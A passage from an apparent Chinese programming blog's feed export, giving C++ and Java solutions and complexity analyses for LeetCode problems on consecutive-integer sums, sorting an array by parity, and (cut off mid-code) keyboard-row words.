<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/he-wei-sde-lian-xu-zheng-shu-xu-lie-lcof/solution/mian-shi-ti-57-ii-he-wei-sde-lian-xu-zheng-shu-x-2/">官方题解</a>:</h6><p><strong>方法一：枚举 + 暴力</strong><br>枚举每个正整数为起点，判断以它为起点的序列和 $\textit{sum}$ 是否等于 $\textit{target}$即可，由于题目要求序列长度至少大于 $2$，所以枚举的上界为 $\lfloor\frac{\textit{target}}{2}\rfloor$。</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败27.15%，内存消耗6.9M，击败35.41%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">findContinuousSequence</span><span class="params">(<span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; vec;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>, limit = (target - <span class="number">1</span>) / <span class="number">2</span>; <span class="comment">// (target - 1) / 2 等效于 target / 2 下取整</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= limit; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i;; ++j) &#123;</span><br><span class="line">                sum += j;</span><br><span class="line">                <span class="keyword">if</span> (sum &gt; target) &#123;</span><br><span class="line">                    sum = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">                    res.clear();</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> k = i; k &lt;= j; ++k) &#123;</span><br><span class="line">                        res.emplace_back(k);</span><br><span class="line">                    &#125;</span><br><span class="line">                    vec.emplace_back(res);</span><br><span class="line">                    sum = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> vec;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：外层需要枚举 $\lfloor\frac{\textit{target}}{2}\rfloor$次，内层判断最多不会超过 $O(\sqrt{\textit{target}})$ 的时间复杂度，因为我们考虑从 $1$ 开始累加到 $\sqrt{\textit{target}}$ ，由求和公式可以得</li>
</ul>
<script type="math/tex; mode=display">
\frac{(1+\sqrt{\textit{target}})*(\sqrt{\textit{target}})}{2}=\textit{target}+\frac{\sqrt{\textit{target}}}{2}> \textit{target}</script><p>​       而如果累加到 $\sqrt{\textit{target}}-1$ ，由求和公式可以得</p>
<script type="math/tex; mode=display">
\frac{(1+\sqrt{\textit{target}}-1)*(\sqrt{\textit{target}}-1)}{2}=\textit{target}-\frac{\sqrt{\textit{target}}}{2}< \textit{target}</script><p>​       所以最多累加到 $\sqrt{\textit{target}}$ ，而以后从 $2,3,\cdots$ 开始的数累加的长度必然也不会超过 $O(\sqrt{\textit{target}})$的       时间复杂度。最后总时间复杂度为内外层循环复杂度相             乘，即 $O(\textit{target}\sqrt{\textit{target}})$</p>
<ul>
<li>空间复杂度：$O(1)$ ，除了答案数组只需要常数的空间存放若干变量。</li>
</ul>
<p><strong>方法二：枚举 + 数学优化</strong><br>方法一在枚举每个正整数为起点判断的时候是暴力从起点开始累加 $\textit{sum}$ 和判断是否等于 $\textit{target}$。但注意到，如果我们知道起点 $x$ 和终点 $y$ ，那么 $x$ 累加到 $y$ 的和由求和公式可以知道是 $\frac{(x+y)*(y-x+1)}{2}$  ，那么问题就转化为了是否存在一个正整数 $y(y&gt;x)$ ，满足等式</p>
<script type="math/tex; mode=display">
\frac{(x+y)*(y-x+1)}{2}=\textit{target}</script><p>转化一下变成</p>
<script type="math/tex; mode=display">
y^2+y-x^2+x-2*\textit{target}=0</script><p>这是一个关于 $y$ 的一元二次方程，其中 $a=1,b=1,c=-x^2+x-2*\textit{target}$直接套用求根公式即可 $O(1)$解得 $y$ ，判断是否整数解需要满足两个条件：</p>
<ul>
<li>判别式 $b^2-4ac$ 开根需要为整数</li>
<li>最后的求根公式的分子需要为偶数，因为分母为 $2$</li>
</ul>
<p><strong>c++代码：</strong>(执行用时4ms，击败66.56%，内存消耗7M，击败23.15%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">findContinuousSequence</span><span class="params">(<span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; vec;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">int</span> sum = <span class="number">0</span>, limit = (target - <span class="number">1</span>) / <span class="number">2</span>; <span class="comment">// (target - 1) / 2 等效于 target / 2 下取整</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> x = <span class="number">1</span>; x &lt;= limit; ++x) &#123;</span><br><span class="line">            <span class="keyword">long</span> <span class="keyword">long</span> delta = <span class="number">1</span> - <span class="number">4</span> * (x - <span class="number">1l</span>l * x * x - <span class="number">2</span> * target);</span><br><span class="line">            <span class="keyword">if</span> (delta &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> delta_sqrt = (<span class="keyword">int</span>)<span class="built_in">sqrt</span>(delta + <span class="number">0.5</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="number">1l</span>l * delta_sqrt * delta_sqrt == delta &amp;&amp; (delta_sqrt - <span class="number">1</span>) % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> y = (<span class="number">-1</span> + delta_sqrt) / <span class="number">2</span>; <span class="comment">// 另一个解(-1-delta_sqrt)/2必然小于0，不用考虑</span></span><br><span class="line">                <span class="keyword">if</span> (x &lt; y) &#123;</span><br><span class="line">                    res.clear();</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> i = x; i &lt;= y; ++i) &#123;</span><br><span class="line">                        res.emplace_back(i);</span><br><span class="line">                    &#125;</span><br><span class="line">                    vec.emplace_back(res);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> vec;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：由于枚举以后只需要 $O(1)$ 的时间判断，所以时间复杂度为枚举起点的复杂度$O(\textit{target})$ 。</p>
</li>
<li><p>空间复杂度：$O(1)$ ，除了答案数组只需要常数的空间存放若干变量。</p>
</li>
</ul>
<p><strong>方法三：双指针</strong><br>我们用两个指针 $l$ 和 $r$ 表示当前枚举到的以 $l$为起点到 $r$ 的区间，$\textit{sum}$ 表示 $[l,r]$ 的区间和，由求和公式可 $O(1)$求得为 $\textit{sum}=\frac{(l+r)*(r-l+1)}{2}$，起始 $l=1,r=2$。</p>
<p>一共有三种情况：</p>
<ul>
<li>如果 $\textit{sum}&lt;\textit{target}$ 则说明指针 $r$ 还可以向右拓展使得 $sum$ 增大，此时指针 $r$ 向右移动，即 <code>r+=1</code></li>
<li>如果 $sum&gt;target$则说明以 $l$ 为起点不存在一个 $r$使得 $sum=target$ ，此时要枚举下一个起点，指针 $l$ 向右移动，即<code>l+=1</code></li>
<li>如果 $\textit{sum}==\textit{target}$ 则说明我们找到了以 $l$为起点得合法解 $[l,r]$ ，我们需要将 $[l,r]$ 的序列放进答案数组，且我们知道以 ll 为起点的合法解最多只有一个，所以需要枚举下一个起点，指针 $l$ 向右移动，即 <code>l+=1</code></li>
</ul>
<p>终止条件即为 $l&gt;=r$的时候，这种情况的发生指针 $r$ 移动到了$\lfloor\frac{\textit{target}}{2}\rfloor+1$的位置，导致 $l&lt;r$ 的时候区间和始终大于 $target$ 。</p>
<p>此方法其实是对方法一的优化，因为方法一是没有考虑区间与区间的信息可以复用，只是单纯的枚举起点，然后从起点开始累加，而该方法就是考虑到了如果已知 $[l,r]$ 的区间和等于 $\textit{target}$ ，那么枚举下一个起点的时候，区间 $[l+1,r]$ 的和必然小于 $\textit{target}$，我们就不需要再从 $l+1$再开始重复枚举，而是从 $r+1$开始枚举，充分的利用了已知的信息来优化时间复杂度。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗7M，击败16.98%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; <span class="title">findContinuousSequence</span><span class="params">(<span class="keyword">int</span> target)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;vec;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> l = <span class="number">1</span>, r = <span class="number">2</span>; l &lt; r;)&#123;</span><br><span class="line">            <span class="keyword">int</span> sum = (l + r) * (r - l + <span class="number">1</span>) / <span class="number">2</span>;</span><br><span class="line">            <span class="keyword">if</span> (sum == target) &#123;</span><br><span class="line">                res.clear();</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = l; i &lt;= r; ++i) &#123;</span><br><span class="line">                    res.emplace_back(i);</span><br><span class="line">                &#125;</span><br><span class="line">                vec.emplace_back(res);</span><br><span class="line">                l++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; target) &#123;</span><br><span class="line">                r++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                l++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> vec;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：由于两个指针移动均单调不减，且最多移动 $\lfloor\frac{\textit{target}}{2}\rfloor$次，即方法一提到的枚举的上界，所以时间复杂度为 $O(\textit{target})$。</p>
</li>
<li><p>空间复杂度：$O(1)$ ，除了答案数组只需要常数的空间存放若干变量。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解提供了多种解法，我用的是方法一枚举加暴力解法，方法三用双指针表示区间这个方法比较巧妙，值得学习。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>按奇偶排序数组</title>
    <url>/2020/11/26/%E6%8C%89%E5%A5%87%E5%81%B6%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/sort-array-by-parity/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个非负整数数组 <code>A</code>，返回一个数组，在该数组中， <code>A</code> 的所有偶数元素之后跟着所有奇数元素。</p>
<p>你可以返回满足此条件的任何数组作为答案。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：[3,1,2,4]</span><br><span class="line">输出：[2,4,3,1]</span><br><span class="line">输出 [4,2,3,1]，[2,4,1,3] 和 [4,2,1,3] 也会被接受。</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ol>
<li><code>1 &lt;= A.length &lt;= 5000</code></li>
<li><code>0 &lt;= A[i] &lt;= 5000</code></li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>已经做过一道类似的题目了<a href="https://z2bns.github.io/2020/11/24/%E6%8C%89%E5%A5%87%E5%81%B6%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84II/">按奇偶排序数组II</a>，这道题的进阶版反而被我先做了🤣，下面给出两种方法</p>
<p>①遍历：定义一个数组result存储排序后的结果，遍历数组A，对偶数元素从左往右存储到result中，对奇数元素从右往左存储到result中。</p>
<p>②双指针：一个指针i指向数组A开头，指针j指向第一个奇数元素，然后遍历A，如果指针i指的是奇数元素就从j开始找到一个偶数元素和i指针元素交换，这里指针其实就是数组下标。</p>
<p><strong>方法一：遍历</strong></p>
<p><strong>c++代码：</strong>(执行用时16ms，击败83.57%，内存消耗16M，击败34.25%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortArrayByParity</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">result</span><span class="params">(A)</span></span>;</span><br><span class="line">        <span class="keyword">int</span> odd=A.size()<span class="number">-1</span>,even=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i:A)&#123;</span><br><span class="line">            <span class="keyword">if</span>(i%<span class="number">2</span>==<span class="number">0</span>)&#123;</span><br><span class="line">                result[even]=i;</span><br><span class="line">                ++even;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                result[odd]=i;</span><br><span class="line">                --odd;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>方法二：双指针</strong></p>
<p><strong>c++代码：</strong>(执行用时16ms，击败83.66%，内存消耗16M，击败29.77%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">sortArrayByParity</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=A.size();</span><br><span class="line">        <span class="keyword">int</span> i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        <span class="comment">//其实只需要遍历偶数的个数次，但是次数未知所以遍历n次</span></span><br><span class="line">        <span class="comment">//找出第一个奇数下标</span></span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(A[i]%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">                j=i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            <span class="comment">//如果当前元素是奇数，从后面找到一个偶数进行交换</span></span><br><span class="line">            <span class="comment">//注意，找到了一个奇数后面不一定有偶数进行交换</span></span><br><span class="line">            <span class="keyword">if</span>(A[i]%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="comment">//j=i;</span></span><br><span class="line">                <span class="keyword">while</span>(j&lt;n &amp;&amp; A[j]%<span class="number">2</span>==<span class="number">1</span>)&#123;</span><br><span class="line">                    ++j;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(j&lt;n)&#123;</span><br><span class="line">                    swap(A[i],A[j]);</span><br><span class="line">                    ++j;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/sort-array-by-parity/solution/an-qi-ou-pai-xu-shu-zu-by-leetcode/">官方题解</a>:</h6><p><strong>方法 1：排序</strong></p>
<p><strong>想法和算法</strong></p>
<p>使用排序算法，按照模 2 的结果排序。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] sortArrayByParity(<span class="keyword">int</span>[] A) &#123;</span><br><span class="line">        Integer[] B = <span class="keyword">new</span> Integer[A.length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> t = <span class="number">0</span>; t &lt; A.length; ++t)</span><br><span class="line">            B[t] = A[t];</span><br><span class="line"></span><br><span class="line">        Arrays.sort(B, (a, b) -&gt; Integer.compare(a%<span class="number">2</span>, b%<span class="number">2</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> t = <span class="number">0</span>; t &lt; A.length; ++t)</span><br><span class="line">            A[t] = B[t];</span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Alternative:</span></span><br><span class="line"><span class="comment">        return Arrays.stream(A)</span></span><br><span class="line"><span class="comment">                     .boxed()</span></span><br><span class="line"><span class="comment">                     .sorted((a, b) -&gt; Integer.compare(a%2, b%2))</span></span><br><span class="line"><span class="comment">                     .mapToInt(i -&gt; i)</span></span><br><span class="line"><span class="comment">                     .toArray();</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N\log N)$，其中 N 是 <code>A</code> 的长度。</li>
<li>空间复杂度：排序空间为 $O(N)$，取决于内置的 <code>sort</code> 函数实现。</li>
</ul>
<p><strong>方法 2：两边扫描</strong></p>
<p><strong>想法和算法</strong></p>
<p>第一遍输出偶数，第二遍输出奇数。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] sortArrayByParity(<span class="keyword">int</span>[] A) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] ans = <span class="keyword">new</span> <span class="keyword">int</span>[A.length];</span><br><span class="line">        <span class="keyword">int</span> t = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length; ++i)</span><br><span class="line">            <span class="keyword">if</span> (A[i] % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">                ans[t++] = A[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length; ++i)</span><br><span class="line">            <span class="keyword">if</span> (A[i] % <span class="number">2</span> == <span class="number">1</span>)</span><br><span class="line">                ans[t++] = A[i];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$ 是 <code>A</code> 的长度。</li>
<li>空间复杂度：$O(N)$，存储结果的数组。</li>
</ul>
<p><strong>方法 3：原地算法</strong></p>
<p><strong>想法</strong></p>
<p>如果希望原地排序，可以使用快排，一个经典的算法。</p>
<p><strong>算法</strong></p>
<p>维护两个指针 <code>i</code> 和 <code>j</code>，循环保证每刻小于 i 的变量都是偶数（也就是 <code>A[k] % 2 == 0</code> 当 <code>k &lt; i</code>），所有大于 <code>j</code> 的都是奇数。</p>
<p>所以， 4 种情况针对 <code>(A[i] % 2, A[j] % 2)</code>：</p>
<ul>
<li>如果是 <code>(0, 1)</code>，那么万事大吉 <code>i++</code> 并且 <code>j--</code>。</li>
<li>如果是 <code>(1, 0)</code>，那么交换两个元素，然后继续。</li>
<li>如果是 <code>(0, 0)</code>，那么说明 i 位置是正确的，只能 <code>i++</code>。</li>
<li>如果是 <code>(1, 1)</code>，那么说明 j 位置是正确的，只能 <code>j--</code>。</li>
</ul>
<p>通过这 4 种情况，循环不变量得以维护，并且 <code>j-i</code> 不断变小。最终就可以得到奇偶有序的数组。</p>
<p><strong>Java代码：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] sortArrayByParity(<span class="keyword">int</span>[] A) &#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">0</span>, j = A.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i] % <span class="number">2</span> &gt; A[j] % <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> tmp = A[i];</span><br><span class="line">                A[i] = A[j];</span><br><span class="line">                A[j] = tmp;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (A[i] % <span class="number">2</span> == <span class="number">0</span>) i++;</span><br><span class="line">            <span class="keyword">if</span> (A[j] % <span class="number">2</span> == <span class="number">1</span>) j--;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li>时间复杂度：$O(N)$，其中 $N$ 是 <code>A</code> 的长度。循环的每一步都让 <code>j-i</code> 至少减少了一。（注意虽然快排的复杂度是 $O(N\log N)$，但是我们只需要一轮扫描就可以了）。</li>
<li>空间复杂度：$O(1)$，不需要额外空间。</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>官方题解给出了3种解法，第一种排序就是根据模2的结果排序（偶数是0，奇数是1）；第二种方法优化一下遍历一次就是我第一种方法；第三种方法原地算法其实就是双指针，只不过比我的要更简便一些，我是没有想到第二个指针从右边开始遍历，最后结束条件是两个指针i和j做比较，我是两个指针都有它们各自的遍历范围，没想到两个指针比较作为结束条件，双指针解法还是挺灵活的。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>键盘行</title>
    <url>/2020/11/27/%E9%94%AE%E7%9B%98%E8%A1%8C/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/flipping-an-image/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给定一个单词列表，只返回可以使用在键盘同一行的字母打印出来的单词。键盘如下图所示。</p>
<a id="more"></a>
<p><img src="/2020/11/27/%E9%94%AE%E7%9B%98%E8%A1%8C/keyboard.png" alt="American keyboard"></p>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入: [&quot;Hello&quot;, &quot;Alaska&quot;, &quot;Dad&quot;, &quot;Peace&quot;]</span><br><span class="line">输出: [&quot;Alaska&quot;, &quot;Dad&quot;]</span><br></pre></td></tr></table></figure>
<p><strong>注意：</strong></p>
<ol>
<li>你可以重复使用键盘上同一字符。</li>
<li>你可以假设输入的字符串将只包含字母。</li>
</ol>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>定义一个map集合，存储字母到数字的映射，键盘第一行字母对应1，第二行对应2，第三行对应3。遍历单词列表，遍历每一个单词字母，判断字母（转成小写）在map中的值是否相等，若不相等break继续下一个单词，若单词字母都在同一行就存储到结果集中。</p>
<p><strong>c++代码：</strong>(执行用时4ms，击败45.62%，内存消耗7.3M，击败23.05%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; <span class="title">findWords</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt;&amp; words)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; result;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; m;</span><br><span class="line">        <span class="built_in">string</span> line1=<span class="string">&quot;qwertyuiop&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> line2=<span class="string">&quot;asdfghjkl&quot;</span>;</span><br><span class="line">        <span class="built_in">string</span> line3=<span class="string">&quot;zxcvbnm&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c1:line1)&#123;</span><br><span class="line">            m[c1]=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c2:line2)&#123;</span><br><span class="line">            m[c2]=<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">char</span> c3:line3)&#123;</span><br><span class="line">            m[c3]=<span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">char</span> tmp1,tmp2;</span><br><span class="line">        <span class="keyword">for</span>(<span class="built_in">string</span> word:words)&#123;</span><br><span class="line">            <span class="keyword">int</span> n=word.length();</span><br><span class="line">            <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;n<span class="number">-1</span>;++i)&#123;</span><br><span class="line">                <span class="comment">//将字母转换成小写</span></span><br><span class="line"> 